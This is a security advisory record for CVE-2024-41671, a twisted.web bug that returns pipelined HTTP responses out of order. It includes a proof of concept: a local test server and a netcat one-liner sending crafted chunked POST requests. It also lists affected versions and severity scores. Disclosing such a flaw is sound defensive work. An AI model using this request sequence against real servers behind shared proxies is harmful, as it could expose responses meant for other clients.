@@ -1,0 +1,234 @@
+advisory_id: GHSA-c8m8-j448-xjx7
+datasource_id: github_osv/GHSA-c8m8-j448-xjx7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-c8m8-j448-xjx7/GHSA-c8m8-j448-xjx7.json
+aliases:
+  - CVE-2024-41671
+summary: |
+  twisted.web has disordered HTTP pipeline response
+  ### Summary
+
+  The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.
+
+  ### PoC
+  0. Start a fresh Debian container:
+  ```sh
+  docker run --workdir /repro --rm -it debian:bookworm-slim
+  ```
+  1. Install twisted and its dependencies:
+  ```sh
+  apt -y update && apt -y install ncat git python3 python3-pip \
+      && git clone --recurse-submodules https://github.com/twisted/twisted \
+      && cd twisted \
+      && pip3 install --break-system-packages .
+  ```
+  2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following:
+  ```python
+  from twisted.web import server, resource
+  from twisted.internet import reactor
+
+  class TheResource(resource.Resource):
+      isLeaf = True
+
+      def render_GET(self, request) -> bytes:
+          return b"GET"
+
+      def render_POST(self, request) -> bytes:
+          return b"POST"
+
+  site = server.Site(TheResource())
+  reactor.listenTCP(80, site)
+  reactor.run()
+  ```
+  3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection:
+  ```sh
+  (printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n'; sleep 1; printf 'GET / HTTP/1.1\r\n\r\n'; sleep 1) | nc localhost 80
+  ```
+  4. Observe that the responses arrive out of order:
+  ```
+  HTTP/1.1 200 OK
+  Server: TwistedWeb/24.3.0.post0
+  Date: Tue, 09 Jul 2024 06:19:41 GMT
+  Content-Length: 5
+  Content-Type: text/html
+
+  POST
+  HTTP/1.1 200 OK
+  Server: TwistedWeb/24.3.0.post0
+  Date: Tue, 09 Jul 2024 06:19:42 GMT
+  Content-Length: 4
+  Content-Type: text/html
+
+  GET
+  HTTP/1.1 200 OK
+  Server: TwistedWeb/24.3.0.post0
+  Date: Tue, 09 Jul 2024 06:19:42 GMT
+  Content-Length: 5
+  Content-Type: text/html
+
+  POST
+  ```
+
+  ### Impact
+  See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server.
+impacted_packages:
+  - purl: pkg:pypi/twisted
+    affected_versions: vers:pypi/<=24.3.0
+    fixed_versions: vers:pypi/24.7.0rc1
+    affected_packages:
+      - pkg:pypi/twisted@1.0.1
+      - pkg:pypi/twisted@1.0.3
+      - pkg:pypi/twisted@1.0.4
+      - pkg:pypi/twisted@1.0.5
+      - pkg:pypi/twisted@1.0.6
+      - pkg:pypi/twisted@1.0.7
+      - pkg:pypi/twisted@1.1.0
+      - pkg:pypi/twisted@1.1.1
+      - pkg:pypi/twisted@1.2.0
+      - pkg:pypi/twisted@2.1.0
+      - pkg:pypi/twisted@2.4.0
+      - pkg:pypi/twisted@2.5.0
+      - pkg:pypi/twisted@8.0.0
+      - pkg:pypi/twisted@8.0.1
+      - pkg:pypi/twisted@8.1.0
+      - pkg:pypi/twisted@8.2.0
+      - pkg:pypi/twisted@9.0.0
+      - pkg:pypi/twisted@10.0.0
+      - pkg:pypi/twisted@10.1.0
+      - pkg:pypi/twisted@10.2.0
+      - pkg:pypi/twisted@11.0.0
+      - pkg:pypi/twisted@11.1.0
+      - pkg:pypi/twisted@12.0.0
+      - pkg:pypi/twisted@12.1.0
+      - pkg:pypi/twisted@12.2.0
+      - pkg:pypi/twisted@12.3.0
+      - pkg:pypi/twisted@13.0.0
+      - pkg:pypi/twisted@13.1.0
+      - pkg:pypi/twisted@13.2.0
+      - pkg:pypi/twisted@14.0.0
+      - pkg:pypi/twisted@14.0.1
+      - pkg:pypi/twisted@14.0.2
+      - pkg:pypi/twisted@15.0.0
+      - pkg:pypi/twisted@15.1.0
+      - pkg:pypi/twisted@15.2.0
+      - pkg:pypi/twisted@15.2.1
+      - pkg:pypi/twisted@15.3.0
+      - pkg:pypi/twisted@15.4.0
+      - pkg:pypi/twisted@15.5.0
+      - pkg:pypi/twisted@16.0.0
+      - pkg:pypi/twisted@16.1.0
+      - pkg:pypi/twisted@16.1.1
+      - pkg:pypi/twisted@16.2.0
+      - pkg:pypi/twisted@16.3.0
+      - pkg:pypi/twisted@16.3.1
+      - pkg:pypi/twisted@16.3.2
+      - pkg:pypi/twisted@16.4.0
+      - pkg:pypi/twisted@16.4.1
+      - pkg:pypi/twisted@16.5.0rc1
+      - pkg:pypi/twisted@16.5.0rc2
+      - pkg:pypi/twisted@16.5.0
+      - pkg:pypi/twisted@16.6.0rc1
+      - pkg:pypi/twisted@16.6.0
+      - pkg:pypi/twisted@16.7.0rc1
+      - pkg:pypi/twisted@16.7.0rc2
+      - pkg:pypi/twisted@17.1.0rc1
+      - pkg:pypi/twisted@17.1.0
+      - pkg:pypi/twisted@17.5.0
+      - pkg:pypi/twisted@17.9.0rc1
+      - pkg:pypi/twisted@17.9.0
+      - pkg:pypi/twisted@18.4.0rc1
+      - pkg:pypi/twisted@18.4.0
+      - pkg:pypi/twisted@18.7.0rc1
+      - pkg:pypi/twisted@18.7.0rc2
+      - pkg:pypi/twisted@18.7.0
+      - pkg:pypi/twisted@18.9.0rc1
+      - pkg:pypi/twisted@18.9.0
+      - pkg:pypi/twisted@19.2.0rc1
+      - pkg:pypi/twisted@19.2.0rc2
+      - pkg:pypi/twisted@19.2.0
+      - pkg:pypi/twisted@19.2.1
+      - pkg:pypi/twisted@19.7.0rc1
+      - pkg:pypi/twisted@19.7.0
+      - pkg:pypi/twisted@19.10.0rc1
+      - pkg:pypi/twisted@19.10.0
+      - pkg:pypi/twisted@20.3.0rc1
+      - pkg:pypi/twisted@20.3.0
+      - pkg:pypi/twisted@21.2.0rc1
+      - pkg:pypi/twisted@21.2.0
+      - pkg:pypi/twisted@21.7.0rc1
+      - pkg:pypi/twisted@21.7.0rc2
+      - pkg:pypi/twisted@21.7.0rc3
+      - pkg:pypi/twisted@21.7.0
+      - pkg:pypi/twisted@22.1.0rc1
+      - pkg:pypi/twisted@22.1.0
+      - pkg:pypi/twisted@22.2.0rc1
+      - pkg:pypi/twisted@22.2.0
+      - pkg:pypi/twisted@22.4.0rc1
+      - pkg:pypi/twisted@22.4.0
+      - pkg:pypi/twisted@22.8.0rc1
+      - pkg:pypi/twisted@22.8.0
+      - pkg:pypi/twisted@22.10.0rc1
+      - pkg:pypi/twisted@22.10.0
+      - pkg:pypi/twisted@23.8.0rc1
+      - pkg:pypi/twisted@23.8.0
+      - pkg:pypi/twisted@23.10.0rc1
+      - pkg:pypi/twisted@23.10.0
+      - pkg:pypi/twisted@24.2.0rc1
+      - pkg:pypi/twisted@24.3.0
+    fixed_packages:
+      - pkg:pypi/twisted@24.7.0rc1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/twisted/twisted
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/twisted/twisted
+        commit: 046a164f89a0f08d3239ecebd750360f8914df33
+        patch_text:
+      - vcs_url: https://github.com/twisted/twisted
+        commit: 4a930de12fb67e88fefcb8822104152f42b27abc
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-c8m8-j448-xjx7/GHSA-c8m8-j448-xjx7.json
+  - score: '6.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-c8m8-j448-xjx7/GHSA-c8m8-j448-xjx7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-444
+references:
+  - url: https://github.com/twisted/twisted
+    reference_type:
+    reference_id:
+  - url: https://github.com/twisted/twisted/commit/046a164f89a0f08d3239ecebd750360f8914df33
+    reference_type:
+    reference_id:
+  - url: https://github.com/twisted/twisted/commit/4a930de12fb67e88fefcb8822104152f42b27abc
+    reference_type:
+    reference_id:
+  - url: https://lists.debian.org/debian-lts-announce/2024/11/msg00028.html
+    reference_type:
+    reference_id:
+  - url: https://www.vicarius.io/vsociety/posts/disordered-http-pipeline-in-twistedweb-cve-2024-4167
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-41671
+    reference_type:
+    reference_id: CVE-2024-41671
+  - url: https://github.com/twisted/twisted/security/advisories/GHSA-c8m8-j448-xjx7
+    reference_type:
+    reference_id: GHSA-c8m8-j448-xjx7
+exploits: []
